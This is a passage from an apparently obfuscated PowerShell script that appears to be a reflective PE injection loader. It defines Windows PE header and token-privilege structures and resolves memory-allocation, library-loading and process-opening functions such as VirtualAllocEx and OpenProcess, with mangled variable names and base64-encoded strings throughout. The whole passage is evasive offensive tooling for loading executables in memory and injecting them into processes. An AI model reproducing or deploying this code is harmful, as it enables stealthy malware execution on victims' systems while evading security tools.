		${_____/\_/=\/=\__/} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${_/==\__/=\/\__/\/} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${___/==\____/\/===}, ${__/\_/=\__/=\__/=}, ${_____/\_/=\/=\__/}, @([Int32] 4))
		${/=======\_/\_/=\_}.SetCustomAttribute(${_/==\__/=\/\__/\/})
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\____/======\_/} = ${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${__/\_/=\__/=\__/=} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${_/==\__/=\/\__/\/} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${___/==\____/\/===}, ${__/\_/=\__/=\__/=}, ${_____/\_/=\/=\__/}, @([Int32] 10))
		${/=\____/======\_/}.SetCustomAttribute(${_/==\__/=\/\__/\/})
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\___/=\____/=\} = ${__/\_/====\/=\/\_}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${__/\___/=\____/=\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 40)
		${/=====\__/\/\/===} = ${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${__/\_/=\__/=\__/=} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${_/==\__/=\/\__/\/} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${___/==\____/\/===}, ${__/\_/=\__/=\__/=}, ${_____/\_/=\/=\__/}, @([Int32] 8))
		${/=====\__/\/\/===}.SetCustomAttribute(${_/==\__/=\/\__/\/})
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\/\__/\_____/\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${__/\/\__/\_____/\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 8)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${___/\_/\/\/===\/\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${___/\_/\/\/===\/\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 20)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/=\__/\_/=\/\/} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${_/\/=\__/\_/=\/\/}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 40)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/=\/=\_/=====\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${/=\/=\/=\_/=====\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 8)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\___/\/=\/\/\__} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value ${_/\___/\/=\/\/\__}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 12)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${_/\___/\/=\/\/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_____/==\_/\/\/\/} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${_____/==\_/\/\/\/}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 16)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${_____/==\_/\/\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/=\/=\_/=\/\__/\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${_/=\/=\_/=\/\__/\}
		return $Win32Types
	}
	Function __/=\/==\_/==\/=\/
	{
		$Win32Constants = New-Object System.Object
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return $Win32Constants
	}
	Function _/=\/===\/\/\/\___
	{
		$Win32Functions = New-Object System.Object
		${___/=\__/=\/====\} = __/===\/==\/\/\/\/ kernel32.dll VirtualAlloc
		${/===\/\/\__/==\/\} = __/==\_/\/\_/\_/== @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${__/\_/\/\___/\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\__/=\/====\}, ${/===\/\/\__/==\/\})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value ${__/\_/\/\___/\_/=}
		${_/=\/=\_/\_/\/\/\} = __/===\/==\/\/\/\/ kernel32.dll VirtualAllocEx
		${/==\/=\_____/=\/=} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${/==\/\__/=\___/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\/=\_/\_/\/\/\}, ${/==\/=\_____/=\/=})
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value ${/==\/\__/=\___/\/}
		${_/\_/\/=\/==\/\/=} = __/===\/==\/\/\/\/ msvcrt.dll memcpy
		${_/=\/=\__/=\_/\_/} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${__/\___/\__/\__/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\/=\/==\/\/=}, ${_/=\/=\__/=\_/\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value ${__/\___/\__/\__/=}
		${/===\/=\/\/=\__/=} = __/===\/==\/\/\/\/ msvcrt.dll memset
		${______/\/\/=\_/=\} = __/==\_/\/\_/\_/== @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${___/\_/====\/=\__} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/=\/\/=\__/=}, ${______/\/\/=\_/=\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value ${___/\_/====\/=\__}
		${_/\_/\__/\___/===} = __/===\/==\/\/\/\/ kernel32.dll LoadLibraryA
		${/\_____/===\/\/=\} = __/==\_/\/\_/\_/== @([String]) ([IntPtr])
		${_/=\/\/\/\__/==\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\_/\__/\___/===}, ${/\_____/===\/\/=\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${_/=\/\/\/\__/==\/}
		${______/\/\__/===\} = __/===\/==\/\/\/\/ kernel32.dll GetProcAddress
		${___/=====\/=\/===} = __/==\_/\/\_/\_/== @([IntPtr], [String]) ([IntPtr])
		${__/===\_/\__/\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${______/\/\__/===\}, ${___/=====\/=\/===})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${__/===\_/\__/\_/=}
		${_/===\/==\___/\_/} = __/===\/==\/\/\/\/ kernel32.dll GetProcAddress
		${/=\/\_/===\___/\_} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr]) ([IntPtr])
		${___/\____/====\_/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/===\/==\___/\_/}, ${/=\/\_/===\___/\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value ${___/\____/====\_/}
		${/=\/=====\/\/\/=\} = __/===\/==\/\/\/\/ kernel32.dll VirtualFree
		${__/==\/====\___/\} = __/==\_/\/\_/\_/== @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${____/=\/\___/\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/=====\/\/\/=\}, ${__/==\/====\___/\})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value ${____/=\/\___/\_/=}
		${__/\/\_________/=} = __/===\/==\/\/\/\/ kernel32.dll VirtualFreeEx
		${__/\/==\_/\_/\___} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${_/\_/=\__/\_/=\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\/\_________/=}, ${__/\/==\_/\_/\___})
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value ${_/\_/=\__/\_/=\/=}
		${__/\/\_/=\/=\/=\_} = __/===\/==\/\/\/\/ kernel32.dll VirtualProtect
		${__/\_/=\/\/=\/\__} = __/==\_/\/\_/\_/== @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${_/\/\__/=\/==\/\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\/\_/=\/=\/=\_}, ${__/\_/=\/\/=\/\__})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${_/\/\__/=\/==\/\_}
		${/==\__/\/\/\_/\__} = __/===\/==\/\/\/\/ kernel32.dll GetModuleHandleA
		${___/==\/\_/\/\/=\} = __/==\_/\/\_/\_/== @([String]) ([IntPtr])
		${_/\/=\/==\/\/\_/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/==\__/\/\/\_/\__}, ${___/==\/\_/\/\/=\})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${_/\/=\/==\/\/\_/\}
		${_/==\_____/\/\/=\} = __/===\/==\/\/\/\/ kernel32.dll FreeLibrary
		${_____/\_/=\/=====} = __/==\_/\/\_/\_/== @([IntPtr]) ([Bool])
		${/=\/=\/\_/==\____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/==\_____/\/\/=\}, ${_____/\_/=\/=====})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${/=\/=\/\_/==\____}
		${_/\___/===\/====\} = __/===\/==\/\/\/\/ kernel32.dll OpenProcess
	    ${/\____/==\/=\__/\} = __/==\_/\/\_/\_/== @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${_/\_/\/=\/=\/==\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\___/===\/====\}, ${/\____/==\/=\__/\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${_/\_/\/=\/=\/==\/}
